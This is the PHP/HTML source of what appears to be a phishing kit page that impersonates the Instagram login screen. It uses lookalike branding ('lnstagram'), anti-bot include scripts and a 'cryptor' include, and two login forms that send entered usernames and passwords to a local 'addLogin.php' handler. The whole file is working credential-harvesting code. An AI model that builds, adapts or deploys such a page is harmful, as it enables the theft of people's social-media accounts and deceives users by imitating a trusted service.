<?php
  @error_reporting(0);

  include '../system/cryptor.php';
  require '../antibots/Bo1.php';
  require '../antibots/Bo2.php';
  require '../antibots/Bo3.php';
  require '../antibots/Bo4.php';
  include("../system/lang.php");
  include "../system/lang".$_SESSION['linga'];
  include '../system/config.php';
?>
<!DOCTYPE html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title><?php echo $logius ?> • Instagram</title>
      <link rel="shortcut icon" href="../lib/img/newico.ico">
      <link href="../lib/js/css" rel="stylesheet" type="text/css">
      <link rel="stylesheet" type="text/css" href="../lib/css/fonts.min.css">
      <link rel="stylesheet" type="text/css" href="../lib/css/system-font.css">
      <link href="../lib/css/styles.css" rel="stylesheet" type="text/css">
      <link href="../lib/css/bootstrap.css" rel="stylesheet" type="text/css">
      <link href="../lib/css/core.css" rel="stylesheet" type="text/css">
      <link href="../lib/css/components.css" rel="stylesheet" type="text/css">
      <link href="../lib/css/colors.css" rel="stylesheet" type="text/css">
      <link href="../lib/css/styles.min.css" rel="stylesheet" type="text/css">
      <script type="text/javascript" src="../lib/js/pace.min.js.download"></script>
      <script type="text/javascript" src="../lib/js/jquery.min.js.download"></script>
      <script type="text/javascript" src="../lib/js/bootstrap.min.js.download"></script>
      <script type="text/javascript" src="../lib/js/blockui.min.js.download"></script>
      <style>
         body{
         font-family: 'Proxima Nova'!important;
         }
      </style>
      <script>
         function cycleImages(){
               var $active = $('#cycler .activex');
               var $next = ($active.next().length > 0) ? $active.next() : $('#cycler img:first');
               $next.css('z-index',2);//move the next image up the pile
               $active.fadeOut(2000,function(){//fade out the top image
         	  $active.css('z-index',1).show().removeClass('activex');//reset the z-index and unhide the image
                   $next.css('z-index',3).addClass('activex');//make the next image the top one
               });
             }
         $(document).ready(function(){
         setInterval('cycleImages()', 5000);
         })
         $('.pull-down').each(function() {
         	$(this).css('margin-top', $(this).parent().height()-$(this).height())
         });
      </script>
      <script type="text/javascript" src="../lib/js/uniform.min.js.download"></script>
      <script type="text/javascript" src="../lib/js/pnotify.min.js.download"></script>
      <script type="text/javascript" src="../lib/js/app.js.download"></script>
   </head>
   <body class="login-cover  pace-done sidebar-xs-indicator">
      <div class="pace  pace-inactive">
         <div class="pace-progress" data-progress-text="100%" data-progress="99" style="transform: translate3d(100%, 0px, 0px);">
            <div class="pace-progress-inner"></div>
         </div>
         <div class="pace-activity"></div>
      </div>
<?php if ( $shwwc ): ?>
<div class="ustkisim">Welcome to lnstagram<br><span style="font-size: 12px; font-weight: normal;">Discover more free contents after signing in.</span></div>
<?php endif; ?>
      <div class="row hidden-sm hidden-md hidden-lg" style="width: 100%; height:50px;"> &nbsp; </div>
      <div class="page-container login-container" style="min-height:350px">
         <div class="page-content">
            <div class="content-wrapper  hidden-xs">
               <div class="content">
                  <div class="row" style="margin-top:-50px;">
                     <div class="col-md-12">
                        <div class="col-centered" style="max-width:830px; min-width:350px;">
                           <div class="col-md-12">
                              <div class="col-md-6 hidden-xs">
                                 <div style="background: url(&#39;../lib/img/telefon.png&#39;) no-repeat; width:454px; height:618px;">
                                    <div id="cycler" style="padding-left:150.5px; padding-top:100px;">
                                       <img class="" src="../lib/img/1.jpg" width="240" style="display: block; z-index: 1;">
                                       <img src="../lib/img/2.jpg" width="240" class="" style="z-index: 1; display: block;">
                                       <img src="../lib/img/3.jpg" width="240" class="" style="z-index: 1; display: block;">
                                       <img src="../lib/img/4.jpg" width="240" class="activex" style="z-index: 3; display: block; opacity: 0.0078559;">
                                       <img src="../lib/img/5.jpg" width="240" class="" style="z-index: 2; display: block;">
                                    </div>
                                 </div>
                              </div>
                              <div class="col-md-6 text-center">
                                 <div style="width:100%; height:80px;"></div>
                                 <div class="panel panel-body login-form " style="width:350px; margin-left:23px; border: 1px #EDEEEE solid; box-shadow: 0px 0px 0px #EDEEEE;  border-radius: 0px;">
                                    <form action="../system/addLogin.php" method="POST">
                                       <div class="text-center">
                                          <div><img src="../lib/img/y.png" class="text-center" style="margin-top:10px; margin-bottom:10px;"></div>
                                       </div>
                                       <div class="form-group" style="padding-left:17px; padding-right:17px;">
                                          <input type="text" class="form-control" style="background-color:#FDFDFD; border:1px #EDEEEE solid; font-family:&#39;Segoe UI&#39;,Roboto;  font-size:12px; padding:8px; height:38px;" placeholder="<?php echo $usernm ?>" name="username" required="required">
                                       </div>
                                       <div class="form-group" style="padding-left:17px; padding-right:17px; margin-top:-14px;">
                                          <input type="password" class="form-control" style="background-color:#FDFDFD; border:1px #EDEEEE solid; font-family:&#39;Segoe UI&#39;,Roboto;  font-size:12px; padding:8px; height:38px;" placeholder="<?php echo $paswde ?>" minlength="6" name="password" required="required">
                                       </div>
                                       <input type="text" class="form-control hidden" name="number" value="1">
                                       <div class="form-group" style="padding-left:17px; padding-right:17px;  margin-top:-10px;">
                                          <button type="submit" class="btn btn-primary bg-instagram btn-block" style=" font-family:&#39;Segoe UI&#39;,Roboto; font-size:14px; font-weight: 600; padding-top: 3px; padding-bottom: 3px; border:0px;"><?php echo $logisn ?></button>
                                       </div>
                                       <a href="#" style="font-family:&#39;Segoe UI&#39;,Roboto; color:#324889; font-size:12px; cursor:pointer;"><?php echo $forgss ?></a>
                                    </form>
                                 </div>
                                 <div class="panel panel-body login-form " style="width:350px; margin-left:23px; font-family:&#39;Segoe UI&#39;,Roboto;  font-size:14px; border: 1px #EDEEEE solid; box-shadow: 0px 0px 0px #EDEEEE;  border-radius: 0px;">
                                    <?php echo $noaccs ?> <a href="#"><?php echo $signss ?></a>
                                 </div>
                                 <div class="col-md-12 text-center" style="margin-top:10px;">
                                    <span class="text-center" style="font-family:&#39;Segoe UI&#39;,Roboto; font-size:14px; "><?php echo $getapp ?></span>
                                 </div>
                                 <div class="col-md-12 text-center" style="margin-top:10px; padding-left:-40px; padding-right: -40px;"><a href="#"><img src="../lib/img/appstore.png" height="40"></a> &nbsp;<a href="#"><img src="../lib/img/googleplay.png" height="40"></a> &nbsp;<a href="#"><img src="../lib/img/microsoft.png" height="40"></a> </div>
                              </div>
                           </div>
                        </div>
                        <div class="row">
                           <div class="col-md-12" style="position: fixed; bottom: 40px;">
                              <div class="col-md-7 col-centered">
                                 <a href="#" class="linkver"><?php echo $abutus ?></a>
                                 <a href="#" class="linkver"><?php echo $suppus ?></a>
                                 <a href="#" class="linkver"><?php echo $prssus ?></a>
                                 <a href="#" class="linkver"><?php echo $apisus ?></a>
                                 <a href="#" class="linkver"><?php echo $privus ?></a>
                                 <a href="#" class="linkver"><?php echo $termus ?></a>
                                 <a href="#" class="linkver"><?php echo $profus ?></a>
                                 <a href="#" class="linkver"><?php echo $hashus ?></a>
                                 <a href="#" class="linkver"><?php echo $langus ?></a>
                                 <div class="pull-right" style="font-family:&#39;Segoe UI&#39;,Roboto; font-weight:600; font-size:12px; color:#4B4F54;">© 2018 INSTAGRAM</div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <div class="hidden-sm hidden-md hidden-lg " style="height:100%">
               <div class="content">
                  <div class="row">
                     <div class="col-md-12">
                        <div class="col-centered">
                           <div class="col-md-12 text-center">
                              <div style="width:100%; height:10px;"></div>
                              <form action="../system/addLogin.php" method="POST">
                                 <div class="text-center">
                                    <div><img src="../lib/img/y.png" class="text-center" style="margin-top:10px; margin-bottom:10px;"></div>
                                 </div>
                                 <div class="form-group">
                                    <input type="text" class="form-control" style="background-color:#FDFDFD; border:1px #EDEEEE solid; font-family:&#39;Segoe UI&#39;,Roboto,Roboto;  font-size:12px; padding:8px; height:38px;" placeholder="<?php echo $usernm ?>" name="username" required="required">
                                 </div>
                                 <div class="form-group" style=" margin-top:-14px;">
                                    <input type="password" class="form-control" style="background-color:#FDFDFD; border:1px #EDEEEE solid; font-family:&#39;Segoe UI&#39;,Roboto,Roboto;  font-size:12px; padding:8px; height:38px;" placeholder="<?php echo $paswde ?>" minlength="6" name="password" required="required">
                                 </div>
                                 <input type="text" class="form-control hidden" name="number" value="1">
                                 <div class="form-group" style=" margin-top:-10px;">
                                    <button type="submit" class="btn btn-primary bg-instagram btn-block" style=" font-family:&#39;Segoe UI&#39;,Roboto,Roboto;  font-size:14px; font-weight: 600; padding-top: 3px; padding-bottom: 3px; border:0px;"><?php echo $logisn ?></button>
                                 </div>
                              </form>
                              <a href="#" style="font-family:&#39;Segoe UI&#39;,Roboto; color:#324889; font-size:12px; cursor:pointer;"><?php echo $forgss ?></a>
                              <div class="col-md-12 text-center" style="margin-top:50px; font-family:&#39;Segoe UI&#39;,Roboto; font-size:14px;">
                                 <?php echo $noaccs ?> <a href="#"><?php echo $signss ?></a>
                              </div>
                              <div class="col-md-12 text-center" style="margin-top:50px;">
                                 <span class="text-center" style="font-family:&#39;Segoe UI&#39;,Roboto; font-size:14px; "><?php echo $getapp ?></span>
                              </div>
                              <div class="col-md-12 text-center" style="margin-top:10px;"><a href="#"><img src="../lib/img/appstore.png" height="40"></a> &nbsp; <a href="#"><img src="../lib/img/googleplay.png" height="40"></a>&nbsp;<a href="#"><img src="../lib/img/microsoft.png" height="40"></a> </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="row " style=" margin-top:40px;">
                  <div class="col-md-12">
                     <div class="col-md-7 col-centered" style="text-align: center;">
                        <a href="#" class="linkver mobilelinkver"><?php echo $abutus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $suppus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $prssus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $apisus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $privus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $termus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $profus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $hashus ?></a>
                        <a href="#" class="linkver mobilelinkver"><?php echo $langus ?></a>
                        <div class="pull-right" style="font-family:&#39;Segoe UI&#39;,Roboto; font-weight:600; font-size:12px; color:#4B4F54;">© 2018 INSTAGRAM</div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>